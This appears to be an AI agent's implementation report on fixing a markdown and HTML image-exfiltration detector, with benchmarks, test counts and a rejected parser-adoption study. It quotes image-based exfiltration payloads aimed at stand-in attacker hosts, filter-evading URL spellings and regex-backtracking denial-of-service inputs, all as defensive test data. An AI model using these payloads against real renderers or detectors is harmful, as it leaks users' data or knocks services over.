STATUS: DONE

# T77 — the parser question, decided by measurement; then T72#F-001, F-002, F-003, F-004, F-005, F-006

The viability decision and its evidence are in `T77-spec.md`, written before a line of production code
was edited. This file records what was changed, what was measured, and which oracle settles which
claim.

| File | SHA-256 before | SHA-256 after | Lines |
|---|---|---|---|
| `src/security/detect/exfil.ts` | `ef029fe36b4f81f224b4b2de4d5ad21ae724ba06de47c67039a4912091efed8a` | `6ee2accef6c1c9e26f569360fce020ee05d620dafba0c2edd7992fdce1b5f65c` | 1198 → 1535 |
| `src/security/detect/exfil.test.ts` | `7953c64ea57c470ebc1603897fb0e02c1f4821fed472ba6d7554584a84badd48` | `fcb41d991e4b2296b05ef459cb78883ffc2c915c454560a50f4c660b0d79e48f` | 1272 → 1520 |
| `docs/requirements/keryx-agent-first-core/policies.md` | `024d1d039921c5e840d144b26ae994e85e8bfa8b59eefb9798ed8b45295beb97` | `5645ed4e363b8b39eb66323b82238e25455aacf43765ec76d8a36015ca835151` | 57 → 58 |

The three "before" hashes are exactly the ones T72 recorded at the start AND at the end of its review,
so every measurement here was taken against precisely the tree T72 reviewed. Every other file in the
dispatch's read set is **unchanged at the byte level**, including the frozen
`acceptance-criteria.md` (`fc255c57…`, T72's value) and `fixtures/exfil/cases.json` (`2f131992…`).
Records: `.T77-hashes-start.txt` / `.T77-hashes-end.txt` in this directory.

New artifacts (this directory): `T77-spec.md`, `T77-viability.ts`, `T77-perf.ts`, `T77-doc.ts`,
`T77-implementation.md`, `T77-result.json`. **No reviewer probe and no review artifact was modified**;
no existing test was weakened or removed; no dependency, lockfile, git or flow state change.

---

## Part 1 — the viability decision: NOT viable, on all four axes

Full evidence in `T77-spec.md` Part 1; raw `.metaproject/data/gdctx/raw/T77-viability.log`. In brief,
with numbers, because the conclusion is the load-bearing one:

| Axis | Verdict | The measurement that decides it |
|---|---|---|
| **Availability** | FAIL | `package.json` `dependencies` is `{}`. `marked` is declared nowhere; `bun.lock:68` shows it reaching this checkout ONLY as a transitive dependency of `@opentui/core`, which this package lists under **`optionalDependencies`**. An `import` in the mandatory floor throws at module load wherever that optional dependency was skipped, taking the floor and all four boundaries with it. Fixing that means adding `marked` to `dependencies`, which this dispatch does not authorize. |
| **Performance** | FAIL | `Lexer.lex` vs `detectExfil` on the same bytes: `"[".repeat(200000)` → **394 696 ms** vs 77.5 ms (**5 093×**); `"![".repeat(200000)` → **813 057 ms** vs 213.4 ms (**3 810×**); balanced 100 KB nest → 34 238 ms vs 114 ms. It is faster only on the two shapes T72#F-003 names. Adopting it trades one denial-of-service surface for a larger one reachable with a simpler payload, and none of the four slow shapes throws, so there is no fail-toward-flagging path either. |
| **Span mapping** | FAIL | Image tokens carry `["type","raw","href","title","text","tokens"]` — no offset of any kind. Concatenating `raw` reproduces an LF document but not a CRLF one (`marked` preprocesses `\r\n`), so reconstructed offsets drift. And `href` is not the source bytes: `![a](ht<TAB>ps://attacker.invalid/p)` yields `href === ""` — **the T24 F-004 vector**, whose tab the URL parser removes — and `https:\\host` comes back as `https:\host`, the T24R2#F-001 class. Classifying `token.href` would release two vectors this floor closed three rounds ago. |
| **Correctness** | FAIL | 12 of 14 measured coverage rows are flagged by the floor and NOT resolved to an attacker image by `marked`: `depth2/3/6`, `unbalancedOpen`, `escapedClose`, `htmlImgInFence`, `baseInFence`, `metaRefresh`, `inputTypeImageCharref`, `srcsetCandidate`, `videoPoster`, `componentMarkup`. A floor must over-approximate; a renderer resolves one flavour. The last six are not markdown at all — `marked` passes raw HTML through untokenized — so the HTML half stays hand-rolled either way. |

**I agree with the orchestrator that a ninth patch of the same kind is the wrong move**, and
`T77-spec.md` Part 0 says why in the module's own terms. What I disagree with is the assumed remedy.
The honest statement is: the right answer here is a real parser; `marked` is not one for this purpose,
and this round therefore fixes the defects by hand while **removing the invented bounds** that
generated the pattern, replacing each with a fact derived from the input.

---

## Part 2 — what changed, defect by defect

### T72#F-001 (blocker) — an image inside a link

The rule is CommonMark's own, and it is not symmetric. An **image's** description is alt text: a
construct written there is not fetched — `![a[b](INNER)](OUTER)` renders one image, `OUTER`, confirmed
against `marked` — so resuming the scan past the whole construct is faithful and is kept. A **link's**
description is content: an image inside it renders with no click, so the description is still scanned
and only the link's **destination span** is skipped. That skip is what keeps the walk linear and is
also what stops `[a](http://h/[x](y))` being read as two constructs.

Both markdown passes carry the same asymmetry, because `[![badge]](href)` — a shortcut reference image
inside a link — is resolved by the reference pass, not the inline one.

Two consequences that had to be handled rather than assumed:

- several opening brackets can now resolve to the **same** destination span, so an inline finding is
  pushed once per span (`flaggedInlineStarts`, the same shape as the existing `flaggedRefStarts`);
- the destination reading and the `SENSITIVE_URL_VALUE` test are **memoised by description end**,
  because `"[".repeat(n) + "](URL)"` gives every one of `n` brackets the same `]` and re-running
  either per bracket is quadratic. Both are functions of the description end alone, which is what
  makes memoising sound rather than convenient.

### T72#F-002 (blocker) — `MAX_REFERENCE_LABEL`

The constant is **gone**, and so is the `REFERENCE_LABEL` regex that read the bytes before anything had
decided whether they could match. What replaces it is not a larger constant:

> A bracket run can only be a label if its normalised form equals a key that this document's own
> `[ref]: URL` lines produced. Normalising collapses whitespace and can never remove a non-whitespace
> character, so `normalise(span).length >= nonWhitespaceCount(span)`, and a span whose non-whitespace
> count already exceeds the longest key in the table cannot match any of them.

That is a **necessary** condition, so it releases nothing a renderer resolves — a 1200-character label
with a 1200-character definition is a finding, and `T77-doc.ts` and the test pin it at 998 / 999 /
1000 / 1200 / 4096 characters. It is O(1) per bracket against a prefix count built in the same single
pass as the bracket index, and the whole reference pass is skipped when the document defines no labels
at all, which is what removes the cost the constant was also there for. **There is no length bound left
in this module for a ninth round to defeat.**

### T72#F-003 (blocker) — catastrophic backtracking

`\(\s*(?:<([^<>\n]*)>|([^)\s]+))[^)]*\)` can only match if a `)` follows the description, and its match
always ends at the **first** such `)` — neither `[^)\s]+` nor `[^)]*` may cross one. So `)` positions
are indexed in the same pass as the brackets and the regex is run only when a binary search finds one.
The reviewer suggested `indexOf(")")`; that is O(n) per bracket and would have been quadratic on the
very shape it was meant to fix, so it is an index and a binary search instead. Combined with the
memoisation above, the cost is O(log n) per bracket when the grammar cannot match.

### T72#F-004 (major) — `srcset` split on raw bytes

A renderer decodes an attribute value before running "parse a srcset attribute" on it. When
`decodeCharacterReferences(value)` carries **more commas than the raw value**, the candidate
boundaries are hidden from the raw split and the decoded candidates' offsets cannot be mapped back one
by one — and offsets must stay on the raw bytes. So the decoded candidates are classified and, if any
of them is a finding, the **whole raw attribute value** is masked: a coarser raw span, never a released
one. When the comma counts agree — every ordinary srcset — nothing about the per-candidate path
changes, which is why all eleven prior matrices are byte-identical.

`considerUrl`'s decision was split out as `isExfilDestination` so this branch can ask the same question
before it knows which span to mask. `considerUrl`'s own behaviour is unchanged.

### T72#F-005 (major) — label normalisation

`normaliseLabel` = `trim → collapse every whitespace run to one space → lowercase`, applied
**identically** at the definition side and the use site. A normalisation applied to one side only is a
bypass, not a repair.

### T72#F-006 (major) — the completeness sentence

`policies.md` §*«Auto-fetch floor: покрытая и непокрытая область»*, `Version: 0.1.3 → 0.1.4`. The
covered list now names the image-inside-a-link case explicitly with the badge idiom as its carrier; a
new sentence states that what a link does not cover is the *navigation*, not its content, and that an
image inside another image's description is alt text and is not a finding; and the matching paragraph
now states the srcset decoding rule, the CommonMark label matching rule, and **that there is no label
length bound at all — the only criterion is whether the document defines the label**. The same three
corrections are in the module header (`exfil.ts:10-33`, `:88-95`), which was T66#F-003's third site.

`T72-doc.ts` — the reviewer's own probe, unmodified — reports `parity: true` over its 77 rows and
`docSaysCoveredButReleased: []`, where it reported five released rows and `parity: false` before.
`T77-doc.ts` (new) turns this round's new sentences into 24 more executable rows and reports
`parity: true`, with 12 of the 15 covered rows renderer-confirmed by `marked`.

### T72#F-007 (minor) — the false performance claims

T71-implementation's Concern 3 said *"the shipped shape is faster than what it replaces on the same
input"* and *"the floor as a whole is still linear-per-file"*. Both were false as written and both are
now **true as measured**, on the reviewer's own probes and on seventeen shapes this change makes newly
reachable — the table in Part 3. The module comment that repeated the first claim (`exfil.ts:488-496`,
now the `ContentIndex` block) has been rewritten to state the measured property with the shape it
applies to.

### T72#F-008 (info) — which oracle settles which question

Recorded in the module header, because three rounds relied on an oracle that cannot answer the
question they asked it. Stated there and here:

| Question | Oracle | Standing |
|---|---|---|
| Does a renderer FETCH this markdown shape? | `marked@17.0.1` | **Settled by measurement.** Every T72#F-001/F-002/F-005 row is renderer-confirmed. |
| Which element owns which attribute; where does a tag end? | Bun `HTMLRewriter` (lol-html) | **Settled by measurement** (T53, T66). |
| Does a renderer DECODE a character reference before reading an attribute value? | **none in this checkout** | `HTMLRewriter` returns the RAW attribute source — `getAttribute("type")` on `type="&#105;mage"` returns `&#105;mage`. It cannot see decoding at all. The premise rests on the **spec text**, §13.2.5.35-.39, and is asserted as such. |
| Does a renderer resolve bracket nesting past depth 1? | **none in this checkout** | `marked` does not, so the depth-2..6 rows stay recorded as deliberate **over-approximation**, exactly as T71 wrote them and T72 accepted. |

Which of my own conclusions rest on which: T72#F-001, F-002 and F-005 are renderer-confirmed by
`marked`. **T72#F-004 is not, and I say so**: `marked` emits no `<img>` for raw HTML, so the three
srcset rows in `T77-doc.log` read `rendererFetchesOnCoveredRows: srcsetDecodedComma=false` — that
finding rests on the same spec clause as the gates, and on nothing else in this checkout. T72#F-003 is
a timing measurement and needs no oracle. The viability decision's four axes are measurements of
`marked` itself, not of any renderer's behaviour.

---

## Part 3 — verification, with counts and raw log paths

All raw logs under `/Users/Goodea/goodea/keryx/.metaproject/data/gdctx/raw/`. Probes ran directly with
`bun` for the reason every prior round on this surface disclosed and which holds here — `ctx run`'s
compaction elides the per-case rows that ARE the evidence. The one required focused-suite run went
through `ctx run` as the dispatch specifies. No network, no model call, no `bun test` without file
arguments. Every host is reserved or synthetic (`attacker.invalid`, `other.invalid`, `ok.example.org`,
`cdn.example.org`, `docs.example.org`, `ci.example.com`, `example.com`); nothing was contacted.

### The reviewer's probes, unmodified — before and after

| Probe | Before | After | Raw (before / after) |
|---|---|---|---|
| `T72-md.ts` (21 named + 120 000-case fuzz) | `rendererConfirmedBypasses: 7` — `[linkedInlineImage, linkedInlineImageNoBang, linkedShortcutImage, linkedFullRefImage, linkedInlineImageProse, longLabelFullRef, longLabelShortcut]` | **`rendererConfirmedBypasses: []`**; `clickGatedControlsFlagged: []`; `supersetViolations: 0` | `T77-before-T72-md.log` / `T77-after-T72-md.log` |
| `T72-md-diff.ts` (13 rows) | `supersetRegressions: [label1000, label1200]`; `rendererConfirmedBypasses: 10` | **`supersetRegressions: []`**, **`rendererConfirmedBypasses: []`** | `T77-before-T72-md-diff.log` / `T77-after-…` |
| `T72-boundary.ts` (27 shapes × 4 boundaries) | `hostileLeakingCount: 5`; `leakingWithStateNone: 5`; `hostileFullyClosed: 14` | **`hostileLeakingCount: 0`**, **`leakingWithStateNone: []`**, `hostileFullyClosed: 19`; all 5 exactness negatives still released; `maskLandsOnRawBytes: true`; `allowlistRemedyWorks: true`; `ac5PublicLinkReleased: true`; `ac5RelativeReleased: true` | `T77-before-T72-boundary.log` / `T77-after-…` |
| `T72-srcset.ts` (6 rows) | 3 rows `verdict=BYPASS` under `allowlist=["cdn.example.org"]` | **all 6 `verdict=ok`** | `T77-before-T72-srcset.log` / `T77-after-…` |
| `T72-gates.ts` (15 rows, 8 branches) | `bypasses: [srcsetCharrefComma, labelInnerWhitespace, labelNewlineInLabel]` | **`bypasses: []`** | (T72's own) / `T77-after-T72-gates.log` |
| `T72-doc.ts` (77 rows) | `docSaysCoveredButReleased: 5`, `parity: false` | **`docSaysCoveredButReleased: []`, `docSaysReleasedButFlagged: []`, `propertyFailures: []`, `parity: true`** | (T72's own) / `T77-after-T72-doc.log` |
| `T72-perf.ts` (12 shapes) | `shapesOverOneSecond: [unterminatedDestination=13 952 ms, unterminatedDestinationAngle=13 150.7 ms, **openRunThenUnterminated=516 829.3 ms**]`; `superLinearShapes: 2` | **`shapesOverOneSecond: []`**, **`superLinearShapes: []`** | `T77-before-T72-perf.log` / `T77-after-…` |
| `T72-perf2.ts` | `shippedGrowthExponent: 2.94`, ratios 2.01–2.12 (shipped ~2× SLOWER than replaced), `realisticPayloadMs: 1 884.4` | **`shippedGrowthExponent: -0.11`**, ratios **0.00–0.02**, **`realisticPayloadMs: 2.9`** | `T77-before-T72-perf2.log` / `T77-after-…` |

The `openRunThenUnterminated` number on this machine measured **516 829.3 ms** where T72 recorded
263 049.7 ms — the defect is worse here than the review found, not better.

### The performance table

Every shape the reviewer measured, before and after, on this machine (`T72-perf.ts`, `T72-perf2.ts`):

| Shape | bytes | before | after | exponent after |
|---|---|---|---|---|
| `openRunThenUnterminated` | 12 505 | **516 829.3 ms** | **0.7 ms** | — |
| `openRunThenUnterminated` | 200 005 | (did not finish) | **12.9 ms** | 1.18 |
| `unterminatedDestination` | 100 005 | 13 952 ms (exp 1.79) | 0.4 ms | — |
| `unterminatedDestination` | 200 005 | (did not finish) | **0.8 ms** | linear |
| `unterminatedDestinationAngle` | 100 006 | 13 150.7 ms (exp 2.10) | 0.4 ms | linear |
| `openBracketRun` | 200 000 | 41.6 ms (worst 121.5) | **13.9 ms** (worst 15.2) | −0.13 |
| `bangBracketRun` | 400 000 | 61.3 ms (worst 65.6) | 22.5 ms | 1.03 |
| `balancedNest` | 400 000 | 302.3 ms | **88.8 ms** | 1.15 |
| `altPairs` | 400 000 | 308.8 ms | 86.4 ms | 1.44 |
| `imagePairs` | 213 312 | 41.1 ms | 19.1 ms | 1.19 |
| `closeBracketRun` | 200 000 | 6.2 ms | 1.9 ms | 1.08 |
| `longLabelUse` | 400 039 | 3.1 ms | 10.2 ms | 0.97 |
| `refDefRun` | 213 312 | 46.3 ms | 11.6 ms | 0.95 |
| `htmlTagRun` | 199 992 | 22 ms | 6.3 ms | 1.12 |
| cubic ladder, 6 005 B (`T72-perf2`) | 6 005 | 29 524.7 ms (old patterns 14 697.3) | **0.9 ms** | — |
| realistic 40 KB tool output | 40 096 | 1 884.4 ms | **2.9 ms** | — |
| T71's headline `openBracketRun200k` | 200 000 | 120.8 ms (old patterns 45 644.9) | **20.2 ms** (old patterns 41 814) | — |

**The shipped code is faster than the pre-T77 code on every shape the reviewer measured except
`longLabelUse` (3.1 → 10.2 ms at 400 KB), and faster than the two patterns T71 replaced on every shape
including the cubic one, where T72 measured it ~2× slower.** The one regression is the price of
removing `MAX_REFERENCE_LABEL`: a 200 000-character label with a matching definition is now actually
resolved instead of being refused at 999 characters. It is linear (exponent 0.97) and 10 ms.

Seventeen shapes this change makes newly reachable (`T77-perf.ts`, raw `T77-perf.log`) — many opens
sharing one description end, many distinct ends reaching one far `)`, the badge idiom repeated, the
label grammar driven from both ends including whitespace-inflated labels, and the HTML controls:

> `shapes: 17`, **`shapesOverOneSecond: []`**, **`superLinearShapes: []`**,
> `worstShape: "labelRunWithDefinition"`, `worstMs: 26.6` (at 200 043 bytes).

**The worst case I found across all 29 measured shapes is `balancedNest` — 400 000 bytes of
`"[".repeat(200000) + "]".repeat(200000)` at 88.8 ms, growth exponent 1.15.** No shape reaches a
tenth of a second at 400 KB, and no shape is super-linear.

### Every prior matrix — eleven, all byte-identical

Run against the tree before the first edit and again after the last, and compared by SHA-256. All
eleven are byte-identical, and **all eleven also equal the hashes T72 recorded**, so this is a
three-way agreement across two rounds rather than a self-comparison:

| Matrix | Result | SHA-256 (before = after = T72's) |
|---|---|---|
| `T42-exfil-attack.ts` (42 cases) | `bypasses: [], falsePositives: []` | `0646c50821177132…` |
| `T24-recheck2-exfil.ts` (48 cases) | `cases=48 bypasses=0 falsePositives=0` | `8c9bfec0481cd229…` |
| `T42-charrefs.ts` (48 × 5 = 240) | no named or numeric spelling bypass | `698d88993076fd92…` |
| `T53-extract.ts` (88 cases) | `bypasses: 0, overApproximations: 14` — the same 14 ids | `ad20286ba1aab3f8…` |
| `T53-resolve.ts` (41 × 15 = 615) | `bypasses: 0, falsePositives: 0` | `0603791031f8f078…` |
| `T53-base.ts` (23 cases) | `hostileNotNeutralized: 0`; benign `[g05, g06, g07, g08]` | `3416d62e56b7674e…` |
| `T53-boundary.ts` (26 shapes) | `hostileLeakingAtAnyBoundary: 0` | `398012ceb8654c55…` |
| **`T42-boundary.ts` (canonicalization + persistence signal)** | `signalMatrix` and every row character-for-character equal | `7030455d39a56b12…` |
| **`T24-recheck2-boundary.ts` (28 MCP cases)** | 0 leaking at any boundary, every reason token unchanged | `838399622c42414f…` |
| `T52-base.ts` (14 cases) | `notNeutralized: [], falsePositives: []` | `a04404db8a1571b1…` |
| `T46-surfaces.ts` (44 rows × 4 boundaries) | `fetchingRows: 36, releasedFetchingCount: 15` — the same deferred set | `d8348c995f7686e1…` |

Raw: `T77-before-<matrix>.log` / `T77-after-<matrix>.log`.

### The benign corpus

`T53-corpus.ts` (the reviewer's, unmodified), raw `T77-before-T53-corpus.log` /
`T77-after-T53-corpus.log`:

| | Before | After |
|---|---|---|
| files scanned | 22 896 | 22 975 (this task's probes, artifacts and logs) |
| **benign files with findings** | **16** | **16 — the same 16 files, the same policy ids per file** |
| benign findings | 60 | **62** |
| new policy id in benign content | — | **none** |
| Part B (30 synthetic benign shapes) | 7 flagged | **7 flagged, the same 7 ids** |

The **+2** is accounted for exactly, not estimated: both are the SAME vector,
`ex09-image-1x1-tracker` (`![ ](https://c2.example-attacker.com/1x1.gif?leak=Y)`), in the two worktree
copies of `fixtures/exfil/cases.json` — the repository's own attack-vector corpus, which the corpus
probe counts as a repository file. Those two files were already in the flagged set with the same
policy ids; each went 2 → 3 findings. It is an attack vector that was being **released** because a
surrounding bracket pair in the JSON made it an image inside a link's description, which is T72#F-001
firing on the repository's own fixture file. **No ordinary file became a finding, and no new benign
carrier was accepted** — this repository's READMEs use the HTML `<img>` form, so widening to the badge
idiom did not move `README.md` (8 findings, `egress.html-image-exfil`, before and after).

### Tests — RED before, GREEN after

`bun test src/security/detect/exfil.test.ts`:

| | Before the fix (new tests, old detector) | After |
|---|---|---|
| tests | 58 | 58 |
| pass | 51 | **58** |
| fail | **7** | **0** |
| expect() | 703 | 812 |

The seven that failed, each written before the corresponding line of production code
(raw `T77-red.log`):

```
(fail) T77#F-001: an image inside a link is a finding in every spelling
(fail) T77#F-002: a reference label past 999 characters is still a finding
(fail) T77#F-005: reference labels are matched with CommonMark whitespace collapse
(fail) T77#F-004: an entity-encoded comma cannot hide a srcset candidate
(fail) T77#F-003: no pathological input inside the mandatory floor
(fail) T77: the persistence materializer never writes an auto-fetch host for the T72 blockers
(fail) T77: the transport validator reports every T72 blocker as redacted with the host gone
```

**No existing test was modified, weakened or removed: 51 of 51 pre-existing tests passed before and
after.** The whole file now runs in 131 ms, including the nine pathological shapes, against 1.74 s in
the RED run.

### Required suites, types, lint

`bun src/cli.ts ctx run -- bun test src/security/detect/exfil.test.ts
src/security/output-validation.test.ts src/mcp/structural-redaction.test.ts
src/security/persistence-sinks.test.ts`

| | T71 / T72 recorded | After |
|---|---|---|
| pass | 102 | **109** |
| fail | 0 | **0** |
| expect() | 980 | **1110** |

Exit 0. Raw `.metaproject/data/gdctx/raw/2026-09-06T19-51-55-779Z_run.log`.

- `bun run typecheck` (`tsc --noEmit`) — **exit 0**, no diagnostics. Raw `T77-after-typecheck.log`.
- `bunx eslint src/security/detect/exfil.ts src/security/detect/exfil.test.ts
  docs/requirements/keryx-agent-first-core/policies.md` — **exit 0, 0 errors**; the Markdown file is
  reported "ignored because no matching configuration was supplied", stated so the omission is not
  silent. Raw `T77-after-eslint.log`.
- `bunx eslint` on the three new probes — **exit 0, 0 errors**, all three outside the lint scope
  ("File ignored because of a matching ignore pattern"). Raw `T77-after-eslint-probes.log`.

### Acceptance criteria

- **AC5 (AFC-15) — met.** No field-name or spelling bypass survives: `T72-md` and `T72-md-diff`
  report `rendererConfirmedBypasses: []` and `supersetRegressions: []`, `T72-gates` reports
  `bypasses: []` across all 8 attribute-consulting branches, `T42-charrefs` (240 cases) and
  `T53-extract` (88 cases) are byte-identical at 0 bypasses, and `T24-recheck2-boundary`'s field-name
  rows are byte-identical. A URL secret is masked — `egress.markdown-link-sensitive-value` still fires
  4 times across the corpus and `T42-boundary`'s `p.password-key` row is character-for-character
  unchanged. A public Markdown link is not treated as a network send — `T72-boundary`'s
  `ac5PublicLinkReleased: true` and `ac5RelativeReleased: true`, all four link spellings released in
  `T72-md` and in `T77-doc`, and the transport test additionally pins a link wrapping a RELATIVE image
  at `state:"none"`.
- **All three blockers and all three majors closed, at the detector and at all four public
  boundaries** — `T72-boundary`'s `hostileLeakingCount: 0` and `leakingWithStateNone: []` cover
  `dispatchCallTool`, `prepareOutputForPersistence`, `validateOutputForTransport` and
  `redactToolOutput` for the F-001 and F-002 rows; the six `T77_CLASS_VECTORS` drive the F-001, F-002
  and F-005 classes through the persistence materializer and the transport validator in the test file.
- **No pathological input inside the floor** — worst case `balancedNest`, 400 000 bytes, **88.8 ms**;
  `shapesOverOneSecond: []` and `superLinearShapes: []` on both the reviewer's 12 shapes and this
  round's 17.
- **Every prior measurement holds** — the eleven matrices are byte-identical by SHA-256 and equal
  T72's own hashes, the character-reference and surface matrices and the canonicalization and
  persistence boundary rows included.
- **The documentation matches the implementation in both directions** — `T72-doc.ts` `parity: true`
  over 77 rows, `T77-doc.ts` `parity: true` over 24 more.

---

## Concerns

1. **`marked` cannot confirm the three srcset rows, and I have not claimed it does.** It emits no
   `<img>` for raw HTML, so `T77-doc.log` records `srcsetDecodedComma=false` in
   `rendererFetchesOnCoveredRows`. That finding rests on HTML Standard §13.2.5.35-.39 plus "parse a
   srcset attribute", the same clause the two attribute gates rest on. **No oracle in this checkout can
   settle it**; a full HTML parser (`parse5`, or `Response`→DOM) would.
2. **The depth-2..6 rows remain over-approximation**, unchanged from T71 and accepted by T72. `marked`
   resolves one level of bracket nesting, so nothing here confirms that a renderer fetches
   `![a[[x]]b](URL)`. The floor flags them because the alternative is a depth bound.
3. **The image-inside-an-image rule is renderer-derived, and it is the one place this round chose the
   narrower reading.** `![a[b](INNER)](OUTER)` flags only `OUTER`, because `marked` renders only
   `OUTER` and CommonMark says an image inside an image's description contributes alt text. It is
   pinned by a test and a doc row and is the behaviour T71 shipped and T72 confirmed, but it is a
   renderer claim from one renderer.
4. **The benign corpus rose 60 → 62.** Both are the same attack vector inside the repository's own
   exfil fixture corpus, in two worktree copies, and both are correct findings. No ordinary file moved.
5. **`inputDupTypeTextFirst` remains a false positive** (T66#F-008, info): `<input type=text
   type=image src=…>` is flagged although a conformant tree builder keeps the first duplicate. Out of
   scope, unchanged, and it errs toward flagging.
6. **`Version:` is outside the subsection I own.** Bumped `0.1.3 → 0.1.4` on the convention T46 set and
   T72 accepted, and because T72#F-006 explicitly asked for it when the completeness sentence changes.
   It is one line to revert, and nothing else in the document was touched.
7. **The viability decision is a decision about `marked`, not about parsers.** If a future round wants
   the real remedy, the shape it needs is a CommonMark implementation that (a) may be declared as a
   real dependency, (b) reports source offsets, and (c) is not super-linear on a bracket run. All three
   are testable before adoption with `T77-viability.ts`, which is why that probe is left behind.

## Routing audit

- `graph_used: no (not-relevant)` — the dispatch named the file set exactly, and the graph answers from
  the last `keryx gdgraph build` while this checkout carries a large uncommitted multi-worker change
  set, so a graph answer could not be quoted as current.
- `wiki_used: no (not-relevant)` — the governing texts are `T72-review.md`, `T71-implementation.md`,
  `T66-review.md`, `T53-review.md`, `T42-review.md`, `policies.md` and the frozen
  `acceptance-criteria.md`; all were read directly as the dispatch required.
- `ctx_used: partial, disclosed` — the required focused-suite run went through `bun src/cli.ts ctx run`
  (exit 0). Four code/artifact searches went through `bun src/cli.ts ctx rg`. Probe and regression
  EXECUTION ran `bun` directly, because `ctx run`'s compaction elides the per-case rows that are this
  task's evidence — the same disclosure T46, T53, T63, T66, T71 and T72 each made, and the dispatch's
  own instruction. Bounded `Read` with `offset`/`limit` was used for every file excerpt.
- `raw_rg_used: no` for project code. No bare `rg`/`grep`/`find` over project code and no `sed`.
  `tail`/`head`/`grep`/`diff` were used only on **my own** probe and test logs and on a listing of my
  own artifact directory, each carrying the `# keryx:raw` marker with its reason.
